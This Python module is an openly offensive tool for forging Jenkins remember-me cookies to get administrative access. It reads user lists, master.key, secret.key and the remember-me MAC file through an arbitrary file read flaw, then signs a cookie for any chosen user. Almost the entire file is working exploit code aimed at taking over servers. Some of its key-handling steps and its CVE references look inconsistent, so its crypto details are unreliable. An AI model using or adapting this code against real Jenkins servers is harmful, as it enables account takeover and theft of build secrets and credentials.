"""
Jenkins Remember-Me Cookie Forgery Module.

This module implements the Jenkins cookie forgery technique to gain administrative access
after extracting master.key and other secret files via arbitrary file read vulnerabilities.

Based on CVE-2024-23897 advisory and cookie signing algorithm reverse engineering.
Reference: https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/
"""

import base64
import hashlib
import hmac
import time
import xml.etree.ElementTree as ET
from dataclasses import dataclass
from typing import Any, Optional

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


@dataclass
class JenkinsUser:
    """Jenkins user information extracted from user XML files."""

    username: str
    full_name: str
    user_seed: str
    password_hash: str
    timestamp: int
    user_file: str


@dataclass
class JenkinsSecrets:
    """Jenkins secret files required for cookie forgery."""

    master_key: bytes
    secret_key: bytes
    mac_file: bytes


class JenkinsCookieForger:
    """
    Forge Jenkins remember-me cookies for authentication bypass.

    This class implements the cookie generation algorithm used by Jenkins for
    the "Remember me" feature. By extracting master.key and other secrets via
    arbitrary file read, an attacker can forge valid cookies for any user.

    Attack Flow:
        1. Read $JENKINS_HOME/users/users.xml to enumerate users
        2. Read $JENKINS_HOME/users/<user>/config.xml for user details
        3. Read secret files: master.key, secret.key, TokenBasedRememberMeServices.mac
        4. Decrypt MAC key using AES with master.key
        5. Generate HMAC-SHA256 signature
        6. Forge cookie: base64(username:expiryTime:signature)

    Example:
        forger = JenkinsCookieForger(session)
        users = forger.parse_users_xml(users_xml_content)
        secrets = JenkinsSecrets(master_key, secret_key, mac_file)
        cookie = forger.forge_cookie(users[0], secrets)
    """

    def __init__(self, session: Optional[Any] = None) -> None:
        """
        Initialize cookie forger.

        Args:
            session: Optional JenkinsSession for automated secret extraction
        """
        self.session = session

    @staticmethod
    def parse_users_xml(users_xml: str) -> list[str]:
        """
        Parse Jenkins users.xml to extract user directory names.

        Args:
            users_xml: Content of $JENKINS_HOME/users/users.xml

        Returns:
            List of user directory names (e.g., ['admin_12345678', 'user_98765432'])
        """
        try:
            root = ET.fromstring(users_xml)
            users = []
            for user_entry in root.findall('.//string'):
                user_dir = user_entry.text
                if user_dir:
                    users.append(user_dir)
            return users
        except Exception as e:
            raise ValueError(f"Failed to parse users.xml: {e}")

    @staticmethod
    def parse_user_config(config_xml: str, user_dir: str) -> JenkinsUser:
        """
        Parse user config.xml to extract user information.

        Args:
            config_xml: Content of $JENKINS_HOME/users/<user>/config.xml
            user_dir: User directory name

        Returns:
            JenkinsUser object with extracted information
        """
        try:
            root = ET.fromstring(config_xml)

            username_elem = root.find('.//id')
            fullname_elem = root.find('.//fullName')
            properties = root.find('.//properties')

            username = username_elem.text if username_elem is not None else ""
            full_name = fullname_elem.text if fullname_elem is not None else username

            user_seed = ""
            password_hash = ""
            timestamp = int(time.time() * 1000)

            if properties is not None:
                seed_elem = properties.find('.//seed')
                if seed_elem is not None:
                    user_seed = seed_elem.text or ""

                password_elem = properties.find('.//passwordHash')
                if password_elem is not None:
                    password_hash = password_elem.text or ""

                timestamp_elem = properties.find('.//timestamp')
                if timestamp_elem is not None:
                    try:
                        timestamp = int(timestamp_elem.text or timestamp)
                    except ValueError:
                        pass

            return JenkinsUser(
                username=username,
                full_name=full_name,
                user_seed=user_seed,
                password_hash=password_hash,
                timestamp=timestamp,
                user_file=user_dir
            )
        except Exception as e:
            raise ValueError(f"Failed to parse user config.xml: {e}")

    @staticmethod
    def decrypt_master_key(master_key_encrypted: bytes, secret_key: bytes) -> bytes:
        """
        Decrypt master.key using secret.key as AES key.

        The master.key file is AES-encrypted using the first 16 bytes of
        the hexadecimal secret.key as the encryption key.

        Args:
            master_key_encrypted: Encrypted master.key content
            secret_key: Content of secret.key (hex string)

        Returns:
            Decrypted master key bytes
        """
        try:
            key_hex = secret_key.decode('utf-8').strip()[:32]
            key = bytes.fromhex(key_hex)

            cipher = AES.new(key, AES.MODE_ECB)
            decrypted = cipher.decrypt(master_key_encrypted)

            return unpad(decrypted, AES.block_size)
        except Exception as e:
            raise ValueError(f"Failed to decrypt master.key: {e}")

    @staticmethod
    def decrypt_mac_key(mac_file: bytes, master_key: bytes) -> bytes:
        """
        Decrypt TokenBasedRememberMeServices.mac using decrypted master.key.

        Args:
            mac_file: Encrypted MAC key file content
            master_key: Decrypted master key (16 bytes for AES-128)

        Returns:
            Decrypted MAC key bytes
        """
        try:
            if len(master_key) > 16:
                aes_key = master_key[:16]
            else:
                aes_key = master_key.ljust(16, b'\x00')

            cipher = AES.new(aes_key, AES.MODE_ECB)
            decrypted = cipher.decrypt(mac_file)

            magic_suffix = b"::::MAGIC::::"
            if not decrypted.endswith(magic_suffix):
                decrypted = unpad(decrypted, AES.block_size)
                if not decrypted.endswith(magic_suffix):
                    raise ValueError("Decrypted MAC key missing magic suffix")

            mac_key = decrypted[:-len(magic_suffix)]
            return mac_key
        except Exception as e:
            raise ValueError(f"Failed to decrypt MAC key: {e}")

    @staticmethod
    def forge_cookie(
        user: JenkinsUser,
        secrets: JenkinsSecrets,
        expiry_hours: int = 1
    ) -> str:
        """
        Forge a Jenkins remember-me cookie for the given user.

        Cookie Algorithm:
            1. token = username:expiryTime:userSeed:secretKey
            2. Decrypt MAC key from mac_file using master_key
            3. signature = HmacSHA256(token, macKey)
            4. cookie = base64(username:expiryTime:hexSignature)

        Args:
            user: JenkinsUser object with user information
            secrets: JenkinsSecrets object with master.key, secret.key, MAC file
            expiry_hours: Cookie expiry time in hours (default: 1)

        Returns:
            Base64-encoded remember-me cookie value
        """
        try:
            expiry_time = int(time.time() * 1000) + (expiry_hours * 3600000)

            decrypted_master_key = JenkinsCookieForger.decrypt_master_key(
                secrets.master_key,
                secrets.secret_key
            )

            mac_key = JenkinsCookieForger.decrypt_mac_key(
                secrets.mac_file,
                decrypted_master_key
            )

            token = f"{user.username}:{expiry_time}:{user.user_seed}:{secrets.secret_key.decode('utf-8').strip()}"

            signature = hmac.new(
                mac_key,
                token.encode('utf-8'),
                hashlib.sha256
            ).digest()

            signature_hex = signature.hex()

            cookie_value = f"{user.username}:{expiry_time}:{signature_hex}"
            cookie_b64 = base64.b64encode(cookie_value.encode('utf-8')).decode('utf-8')

            return cookie_b64
        except Exception as e:
            raise ValueError(f"Failed to forge cookie: {e}")

    def extract_secrets_from_session(
        self,
        jenkins_home: str = "/var/jenkins_home"
    ) -> Optional[JenkinsSecrets]:
        """
        Automatically extract Jenkins secrets using file read vulnerability.

        This method requires a session with a working arbitrary file read exploit.

        Args:
            jenkins_home: Jenkins home directory path (default: /var/jenkins_home)

        Returns:
            JenkinsSecrets object or None if extraction fails
        """
        if not self.session:
            return None

        try:
            master_key_path = f"{jenkins_home}/secrets/master.key"
            secret_key_path = f"{jenkins_home}/secret.key"
            mac_path = f"{jenkins_home}/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac"

            master_key = self.session.read_file(master_key_path)
            secret_key = self.session.read_file(secret_key_path)
            mac_file = self.session.read_file(mac_path)

            if not all([master_key, secret_key, mac_file]):
                return None

            return JenkinsSecrets(
                master_key=master_key,
                secret_key=secret_key,
                mac_file=mac_file
            )
        except Exception:
            return None

    def extract_users_from_session(
        self,
        jenkins_home: str = "/var/jenkins_home"
    ) -> list[JenkinsUser]:
        """
        Automatically extract Jenkins users using file read vulnerability.

        Args:
            jenkins_home: Jenkins home directory path

        Returns:
            List of JenkinsUser objects
        """
        if not self.session:
            return []

        try:
            users_xml_path = f"{jenkins_home}/users/users.xml"
            users_xml = self.session.read_file(users_xml_path).decode('utf-8')

            user_dirs = self.parse_users_xml(users_xml)
            users = []

            for user_dir in user_dirs:
                config_path = f"{jenkins_home}/users/{user_dir}/config.xml"
                try:
                    config_xml = self.session.read_file(config_path).decode('utf-8')
                    user = self.parse_user_config(config_xml, user_dir)
                    users.append(user)
                except Exception:
                    continue

            return users
        except Exception:
            return []

    @staticmethod
    def validate_cookie(cookie: str) -> bool:
        """
        Validate that a forged cookie has the correct format.

        Args:
            cookie: Base64-encoded cookie value

        Returns:
            True if cookie format is valid, False otherwise
        """
        try:
            decoded = base64.b64decode(cookie).decode('utf-8')
            parts = decoded.split(':')

            if len(parts) != 3:
                return False

            username, expiry, signature = parts

            if not username or not expiry.isdigit() or len(signature) != 64:
                return False

            return True
        except Exception:
            return False
